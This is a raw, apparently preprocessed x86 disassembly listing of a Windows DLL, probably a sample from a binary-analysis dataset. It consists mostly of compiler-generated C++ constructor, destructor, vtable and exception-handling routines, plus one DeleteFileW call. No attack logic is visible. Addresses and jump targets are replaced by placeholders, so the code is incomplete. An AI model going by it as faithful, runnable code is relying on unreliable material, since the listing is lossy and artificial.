mov [ esi + 0x18 ] 0x7
call sub_10002630
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_10001667
mov eax esi
pop esi
retn 0x8
sub_10004a57
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0x7
call sub_10002630
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_10005e06
mov eax esi
pop esi
retn 0x8
sub_10005c3c
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005c53
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x14 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005c6a
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005f78
mov [ esi ] r--data
pop esi
retn
sub_10005c80
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001362
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005c9a
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001362
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005cb4
push esi
mov esi ecx
call sub_10005c6a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10005cd0
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_100021a7
push [ esp + 0xc ]
mov ecx esi
push [ esp + 0xc ]
call sub_10005f98
mov eax esi
pop esi
retn 0x8
sub_10005f61
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10005f78
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10027c56
push [ esi + 0x10 ]
call sub_10027c56
push [ esi + 0x14 ]
call sub_10027c56
add esp 0xc
pop esi
retn
sub_1000697d
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10022358
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_1000699e
mov eax [ esp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10022358
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
mov eax esi
pop esi
retn 0x8
sub_10006b16
mov ecx [ ebp - 0x14 ]
call sub_10005f78
xor ebx ebx
push ebx
push ebx
call sub_1002ae74
int3
sub_10007386
push esi
mov esi ecx
call sub_100074cf
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100074b0
retn 0x4
sub_100074b3
push esi
mov esi ecx
call sub_10007dbd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10007564
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_100075df
push esi
mov esi ecx
call sub_100075fb
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100075fb
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10027a85
pop ecx
sub_1000761b
add ecx 0x8
push ecx
push [ esp + 0x10 ]
push [ esp + 0x10 ]
push [ esp + 0x10 ]
call sub_10021ef2
add esp 0x10
retn 0xc
sub_100076bb
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_100227ec
pop ecx
pop ecx
retn 0x4
sub_100076fa
add ecx 0x8
push ecx
push [ esp + 0x8 ]
call sub_1002277f
pop ecx
pop ecx
retn 0x4
sub_1000770c
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x2c ]
pop ebp
retn 0xc
j_sub_1000772d
jmp sub_1000772d
j_sub_100077c8
jmp sub_100077c8
sub_100078bb
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_10007889
mov eax esi
pop esi
retn 0x8
sub_1000792f
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
add eax 0x18
push eax
call sub_10002255
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10007b47
mov eax 0xffff
retn
sub_10007bb9
add ecx 0x8
push ecx
push [ esp + 0xc ]
call sub_10021ec3
test [ esp + 0xc ] ax
pop ecx
pop ecx
push 0x0
pop eax
setne al
retn 0x8
sub_10007d6c
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax ]
mov [ esi ] ecx
call sub_10007d44
mov eax esi
pop esi
retn 0x4
sub_10007e82
push ecx
mov [ ecx ] r--data
call sub_10021dee
pop ecx
retn
sub_10007eef
push 0x4
mov eax sub_10051d58
call sub_1002b2d9
and [ ebp - 0x4 ] 0x0
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
test [ eax + ecx + 0x10 ] 0x2
je r-xdata
call sub_1002b37e
retn
call sub_100081e0
sub_10007f16
mov eax r-xdata
retn
sub_10007f62
mov eax 0xffff
retn 0x4
sub_10008060
mov [ ecx ] r--data
jmp sub_10001d9b
sub_1000806b
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001d9b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000808d
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001db8
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_100081bf
push ecx
mov eax [ edx + 0x8 ]
or eax [ esp + 0x8 ]
cmp [ edx + 0x28 ] 0x0
jne r-xdata
push [ esp + 0xc ]
mov ecx eax
push edx
call sub_100080a5
pop ecx
retn 0x8
or eax 0x4
sub_10008381
push esi
mov esi ecx
call sub_1000839d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10008409
push ecx
and [ esp ] 0x0
push ebx
mov ebx eax
push 0x0
call sub_100158ba
pop ecx
mov eax ebx
pop ebx
pop ecx
retn
sub_100084cd
push 0x2c
mov eax sub_10052c2a
call sub_1002b345
and [ ebp - 0x4 ] 0x0
mov esi ecx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x31 ] 0x1
call sub_10008670
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x31 ] al
jmp sub_10008501
sub_100084f4
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10008769
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x28 ] 0x20
je r-xdata
mov [ ebp - 0x4 ] 0x6
mov eax r-xdata
retn
push 0x0
push 0x0
call sub_1002ae74
sub_10008906
mov [ ebp - 0x4 ] 0xf
mov eax r-xdata
retn
sub_10008b94
and [ ebp - 0x4 ] 0x0
mov eax r-xdata
retn
sub_10008dca
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
retn
jmp sub_1000af0a
sub_10008e14
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_100091ac
call sub_100084cd
xor eax eax
retn
sub_10009555
push 0x0
mov eax sub_100505a8
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10009760
push [ esi ]
call sub_100272e8
pop ecx
call sub_1002b37e
retn 0x4
sub_10009760
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
and [ esi + 0xc ] 0x0
and [ esi + 0x10 ] 0x0
and [ esi + 0x14 ] 0x0
retn
push [ esi + 0x10 ]
call sub_10009849
push [ esi + 0xc ]
call sub_100272e8
pop ecx
sub_10009e03
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1002762d
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_10009d64
pop esi
retn 0x4
sub_10009ff5
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000a013
pop esi
retn
sub_1000a013
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ad89
mov [ esi ] r--data
mov ecx esi
jmp sub_10001cf1
sub_1000a034
sub ecx 0x28
jmp sub_1000a09e
sub_1000a07d
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000a0c2
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_1002ae74
int3
sub_1000a09e
push esi
mov esi ecx
call sub_10009ff5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000a0ba
sub ecx 0x3c
jmp sub_1000a09e
sub_1000a0c2
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a113
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a0ef
push esi
mov esi ecx
call sub_1000a013
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000a10b
sub ecx 0x28
jmp sub_1000a0ef
sub_1000a15a
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a6d7
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a27d
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000a29b
pop esi
retn
sub_1000a29b
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ad89
mov [ esi ] r--data
mov ecx esi
jmp sub_10001cf1
sub_1000a2bc
sub ecx 0x28
jmp sub_1000a326
sub_1000a305
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000a34a
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_1002ae74
int3
sub_1000a326
push esi
mov esi ecx
call sub_1000a27d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000a342
sub ecx 0x3c
jmp sub_1000a326
sub_1000a34a
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a39b
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a377
push esi
mov esi ecx
call sub_1000a29b
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000a393
sub ecx 0x28
jmp sub_1000a377
sub_1000a3e2
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a6d7
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a3fa
mov [ ecx ] r--data
jmp sub_10001cf1
sub_1000a55a
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000a578
pop esi
retn
sub_1000a578
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ad89
mov [ esi ] r--data
mov ecx esi
jmp sub_10001cf1
sub_1000a599
sub ecx 0x28
jmp sub_1000a603
sub_1000a5e2
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000a627
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_1002ae74
int3
sub_1000a603
push esi
mov esi ecx
call sub_1000a55a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000a61f
sub ecx 0x3c
jmp sub_1000a603
sub_1000a627
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a678
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a654
push esi
mov esi ecx
call sub_1000a578
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000a670
sub ecx 0x28
jmp sub_1000a654
sub_1000a6bf
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000a6d7
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a6d7
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001c66
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a72f
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001ca0
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000a747
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10001cf1
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000aa6d
cmp [ esp + 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
retn
cmp [ esp + 0x8 ] 0x7fffffff
jne r-xdata
xor eax eax
inc eax
retn
sub_1000ac8e
push esi
mov esi ecx
mov [ ecx ] r--data
mov [ ecx + 0x28 ] r--data
mov [ ecx + 0x3c ] r--data
call sub_1000acac
pop esi
retn
sub_1000acac
lea ecx [ esi + 0x28 ]
mov [ esi ] r--data
mov [ ecx ] r--data
call sub_1000ad89
mov ecx esi
jmp sub_10001d9b
sub_1000acc7
mov [ ecx ] r--data
retn
sub_1000acce
sub ecx 0x28
jmp sub_1000ad38
sub_1000ad17
push ebp
mov ebp esp
add ecx 0xffffffc4
sub esp 0x40
push ecx
lea ecx [ ebp - 0x40 ]
call sub_1000ad5c
push r--data
lea eax [ ebp - 0x40 ]
push eax
call sub_1002ae74
int3
sub_1000ad38
push esi
mov esi ecx
call sub_1000ac8e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000ad54
sub ecx 0x3c
jmp sub_1000ad38
sub_1000ad5c
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1000adcc
mov [ esi + 0x3c ] r--data
mov [ esi ] r--data
mov [ esi + 0x28 ] r--data
mov [ esi + 0x3c ] r--data
mov eax esi
pop esi
retn 0x4
sub_1000ada8
push esi
mov esi ecx
call sub_1000acac
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000adc4
sub ecx 0x28
jmp sub_1000ada8
sub_1000ae13
mov ecx [ esi ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
call [ eax + 0x10 ]
test al al
je r-xdata
and [ esi ] 0x0
sub_1000ae5c
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000ae79
mov eax ecx
mov [ eax ] r--data
retn 0x4
sub_1000af51
push esi
mov esi ecx
call sub_1000af6d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000af6d
push edi
lea edi [ ecx + 0x4 ]
mov [ ecx ] r--data
call sub_100026f6
pop edi
retn
sub_1000b35a
cmp [ ebp + 0xa8 ] 0x8
mov eax [ ebp + 0x94 ]
jae r-xdata
push eax
call [ DeleteFileW@IAT ]
mov [ ebp - 0x4 ] 0x9
mov eax r-xdata
retn
lea eax [ ebp + 0x94 ]
sub_1000b6e6
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_1000ba1c
push esi
mov [ esi ] r--data
call sub_10021dee
pop ecx
pop esi
retn
sub_1000ba54
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
mov eax [ ecx - 0xc ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0xc ] r--data
retn
sub_1000bf0b
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_1000b6e6
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000bf5b
push esi
mov esi ecx
call sub_1000ba7f
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000c6e3
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_1002ae74
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000c723
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000cd53
push esi
mov esi ecx
call sub_1000cd8c
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000cd6f
mov eax [ ecx + 0x14 ]
test eax eax
jle r-xdata
jge r-xdata
push [ ecx + 0x10 ]
call sub_10027a85
pop ecx
retn
retn
push [ ecx + 0x10 ]
call sub_10027c56
pop ecx
sub_1000cd8c
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000cd6f
mov [ esi ] r--data
pop esi
retn
sub_1000cdcd
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_1002236e
pop ecx
pop ecx
retn 0x4
sub_1000ce0c
movzx eax [ esp + 0x4 ]
add ecx 0x8
push ecx
push eax
call sub_10022e02
pop ecx
pop ecx
retn 0x4
sub_1000ce20
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
sub edx [ ebp + 0x8 ]
mov eax [ ecx ]
push edx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x1c ]
pop ebp
retn 0xc
sub_1000ce3c
mov al [ esp + 0x4 ]
retn 0x4
sub_1000ce90
mov al [ esp + 0x4 ]
retn 0x8
sub_1000ceea
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi ecx
mov [ esi + 0x4 ] eax
mov [ esi ] r--data
call sub_1000cec5
mov eax esi
pop esi
retn 0x8
sub_1000d0ec
push esi
mov esi ecx
call sub_1000d27a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000d108
or eax 0xffffffff
retn 0x4
sub_1000d10e
push [ esp + 0x8 ]
mov eax [ ecx ]
push 0xffffffff
push [ esp + 0xc ]
call [ eax + 0x1c ]
retn 0x8
sub_1000d120
or eax 0xffffffff
retn
sub_1000d241
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x10
sub_1000d25b
mov eax [ esp + 0x4 ]
mov ecx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
retn 0x20
sub_1000d275
mov eax ecx
retn 0x8
sub_1000d2d9
mov eax [ ecx - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x4 ] r--data
retn
sub_1000d31e
mov eax [ ecx - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x8 ] r--data
retn
sub_1000d32d
push [ ecx + 0xc ]
call sub_1000d36c
pop ecx
retn
sub_1000d36c
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_1000d337
push esi
call sub_100272e8
pop ecx
sub_1000d3cb
push [ ebp + 0x8 ]
call sub_1000d36c
pop ecx
push 0x0
push 0x0
call sub_1002ae74
int3
sub_1000d3de
retn
sub_1000d404
push esi
mov esi ecx
call sub_10001bdf
and [ esi + 0x1c ] 0x0
and [ esi + 0x20 ] 0x0
mov eax esi
pop esi
retn
sub_1000d418
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
jmp sub_1000af0a
sub_1000d477
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000d482
push ecx
push esi
push r-xdata
push [ esp + 0x10 ]
mov esi eax
call sub_10016a10
mov [ esi ] r--data
mov eax esi
pop esi
pop ecx
retn 0x4
sub_1000d4a1
push esi
mov esi ecx
call sub_1000d4bd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000d4bd
push ecx
mov [ ecx ] r--data
call sub_10016abb
pop ecx
retn
sub_1000d4cb
push esi
mov esi ecx
call sub_1000d4e7
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000d5d5
add ecx 0x4
push ecx
call sub_10016c79
pop ecx
retn
sub_1000d8d3
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_100021a7
push 0x0
push [ esp + 0x8 ]
mov ecx esi
call sub_10005f98
mov eax esi
retn 0x4
sub_1000d8f5
push esi
mov esi ecx
call sub_1000d911
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000da92
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000d4bd
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000dab4
mov [ ecx ] r--data
jmp sub_1000d4bd
sub_1000dd65
push esi
mov esi ecx
call sub_1000dd81
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000dd81
push 0x0
mov [ ecx ] r--data
push 0x1
add ecx 0x4
call sub_1000264e
retn
sub_1000e061
push esi
mov esi eax
add esi 0x58
mov ecx esi
call sub_1000e33f
push esi
mov [ esi ] r--data
call sub_10021dee
pop ecx
pop esi
retn
sub_1000e14d
push esi
mov esi eax
add esi 0x54
mov ecx esi
call sub_1000eb09
push esi
mov [ esi ] r--data
call sub_10021dee
pop ecx
pop esi
retn
sub_1000eb48
push esi
lea esi [ ecx - 0x58 ]
mov eax esi
call sub_1000e061
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000eb67
push esi
mov esi ecx
call sub_1000e37e
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000eb83
push esi
lea esi [ ecx - 0x54 ]
mov eax esi
call sub_1000e14d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000edbd
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
mov [ eax ] ecx
mov eax [ esp + 0x1c ]
mov ecx [ esp + 0x14 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x1c
sub_1000edd7
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
push 0x3
mov [ eax ] ecx
pop eax
retn 0x10
sub_1000ede7
mov eax [ esp + 0xc ]
sub eax [ esp + 0x8 ]
cmp [ esp + 0x10 ] eax
jae r-xdata
retn 0x10
mov eax [ esp + 0x10 ]
sub_1000edfc
push [ eax + 0x38 ]
mov ecx [ esp + 0x8 ]
call sub_10007d6c
mov eax [ esp + 0x4 ]
retn 0x4
sub_1000f109
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_1002ae74
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_1000f17d
push 0x4
mov eax sub_10051b12
call sub_1002b2d9
mov esi ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
test [ eax + esi + 0x10 ] 0x2
je r-xdata
call sub_1002b37e
retn
call sub_1000cd22
sub_1000f1a6
mov eax r-xdata
retn
sub_1000f1f2
mov eax [ eax ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax + 0x28 ]
test eax eax
je r-xdata
retn
lea ecx [ eax + 0x4 ]
jmp sub_10021d73
sub_1000f269
xor eax eax
inc eax
retn
sub_1000f26d
mov [ ecx ] r--data
retn
sub_1000f274
mov al 0x1
retn
sub_1000f277
mov [ ecx ] r--data
retn
sub_1000f27e
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000f30e
push esi
mov esi ecx
call sub_1000f32a
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1000f5b0
mov [ ebp - 0x4 ] 0x2
mov eax sub_1000f5bd
retn
sub_1000f5ca
push esi
mov esi ecx
lea eax [ esi + 0x1c ]
mov [ esi ] r--data
call sub_1000f766
add esi 0x4
call sub_100015ca
push [ esi ]
call sub_100272e8
pop ecx
pop esi
retn
sub_1000f672
push esi
mov esi ecx
call sub_1000f5ca
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_100107d3
push 0x0
mov eax sub_1005093d
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_100025cf
mov eax esi
call sub_1002b37e
retn 0x8
sub_10010801
push esi
mov esi ecx
call sub_1001081d
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1001081d
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x4 ]
mov [ esi ] r--data
call sub_1000264e
mov [ esi ] r--data
pop esi
retn
sub_1001083a
push esi
push [ esp + 0xc ]
mov esi ecx
mov eax [ esi ]
call [ eax + 0xc ]
push [ esp + 0x8 ]
mov eax [ esi ]
mov ecx esi
call [ eax + 0x8 ]
pop esi
retn 0x8
sub_10010ae4
push esi
mov esi ecx
call sub_10010b00
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_10010df9
mov eax r-xdata
retn
sub_10010e45
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
call sub_1002ae74
int3
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10010ea1
mov [ ecx ] r--data
retn
sub_100116b9
mov [ ebp - 0x4 ] 0x5
mov eax r-xdata
retn
sub_100116c6
mov eax r-xdata
retn
sub_100116cc
mov eax r-xdata
retn
sub_10011929
mov eax r-xdata
retn
sub_10011e68
mov eax r-xdata
retn
sub_10011f93
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10012791
mov [ ebp - 0x4 ] 0x5
mov eax r-xdata
retn
sub_1001287e
push r--data
lea ecx [ ebp - 0x94 ]
call sub_100014f8
mov [ ebp - 0x4 ] 0xc
mov eax r-xdata
retn
sub_1001299d
push r--data
lea ecx [ ebp - 0x34 ]
call sub_100014f8
mov [ ebp - 0x4 ] 0x13
mov eax r-xdata
retn
sub_10012c75
mov [ ebp - 0x4 ] 0x8
mov eax r-xdata
retn
sub_10013234
mov [ ecx ] r--data
jmp sub_10001d9b
sub_10013847
or [ ebp - 0x4 ] 0xffffffff
mov eax r-xdata
retn
sub_10013909
push [ eax ]
call sub_100272e8
pop ecx
retn
sub_10013b50
cmp [ esp + 0xc ] 0x0
jbe r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
retn
inc eax
inc eax
dec [ esp + 0xc ]
jne r-xdata
mov cx [ eax ]
cmp cx [ esp + 0x8 ]
je r-xdata
sub_10013b70
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10001db8
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_10013b88
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_10027160
pop ecx
push eax
push [ esp + 0xc ]
mov ecx esi
call sub_100072a4
pop esi
retn 0x4
sub_10013c15
push esi
mov esi ecx
call sub_10013c31
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100272e8
pop ecx
sub_1001420c
push ecx
and [ esp ] 0x0
push ebx
add eax 0xc
